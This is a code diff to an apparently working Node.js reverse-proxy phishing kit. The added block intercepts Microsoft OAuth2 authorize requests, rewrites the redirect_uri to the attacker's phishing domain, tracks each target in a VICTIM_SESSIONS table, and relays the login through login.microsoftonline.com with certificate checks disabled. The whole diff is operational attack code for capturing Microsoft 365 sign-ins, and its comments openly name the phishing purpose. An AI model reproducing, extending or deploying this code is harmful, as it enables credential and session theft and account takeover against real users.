@@ -96,7 +96,80 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     } else {
         console.log('[INCOMING COOKIE] (none)');
     }
+    // ---- DIRECT OAUTH2 AUTHORIZE ENTRY ----
+if (url.startsWith('/organizations/oauth2/v2.0/authorize')) {
+    try {
+        // Parse the request URL
+        const parsedUrl = new URL(url, `http://${headers.host}`);
+        const redirectUri = parsedUrl.searchParams.get('redirect_uri');
+        if (!redirectUri) throw new Error('Missing redirect_uri');
 
+        // Rewrite the redirect_uri to your phishing domain
+        const newRedirectUri = redirectUri.replace(/https?:\/\/[^\/]+/, `https://${PHISHING_DOMAIN}`);
+        parsedUrl.searchParams.set('redirect_uri', newRedirectUri);
+
+        // Reconstruct the path with modified query
+        const newPath = parsedUrl.pathname + parsedUrl.search;
+
+        // Create a session (if none exists)
+        let session = currentSession;
+        if (!session) {
+            // Use the original (real) redirect_uri as the target
+            const phishedURL = new URL(redirectUri);
+            const { cookieName, cookieValue } = generateNewSession(phishedURL);
+            const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
+            clientResponse.setHeader("Set-Cookie", cookieHeader);
+            console.log(`[SET SESSION COOKIE (OAuth)] ${cookieHeader}`);
+            session = cookieName;
+            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
+            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
+            VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
+            VICTIM_SESSIONS[session].port = phishedURL.port;
+            VICTIM_SESSIONS[session].host = phishedURL.host;
+        }
+
+        // Forward to the real Microsoft endpoint
+        const targetUrl = new URL(`https://login.microsoftonline.com${newPath}`);
+        const proxyRequestOptions = {
+            hostname: targetUrl.hostname,
+            port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
+            method: method,
+            path: targetUrl.pathname + targetUrl.search,
+            headers: { ...headers },
+            rejectUnauthorized: false
+        };
+        delete proxyRequestOptions.headers.host;
+        proxyRequestOptions.headers.host = targetUrl.host;
+
+        // Treat as a navigation request so redirects are rewritten
+        const isNavigationRequest = true;
+        // Update session target to the authorize endpoint
+        VICTIM_SESSIONS[session].protocol = targetUrl.protocol;
+        VICTIM_SESSIONS[session].hostname = targetUrl.hostname;
+        VICTIM_SESSIONS[session].path = targetUrl.pathname + targetUrl.search;
+        VICTIM_SESSIONS[session].port = targetUrl.port;
+        VICTIM_SESSIONS[session].host = targetUrl.host;
+
+        // Call the existing proxy function
+        makeProxyRequest(
+            targetUrl.protocol,
+            proxyRequestOptions,
+            session,
+            headers.host, // proxyHostname
+            '', // no request body
+            clientResponse,
+            isNavigationRequest
+        ).catch(error => displayError("OAuth proxy request failed", error));
+
+        return; // Stop further processing
+    } catch (error) {
+        displayError("OAuth entry parsing failed", error, url);
+        clientResponse.writeHead(404, { "Content-Type": "text/html" });
+        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+        return;
+    }
+            }
+    
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
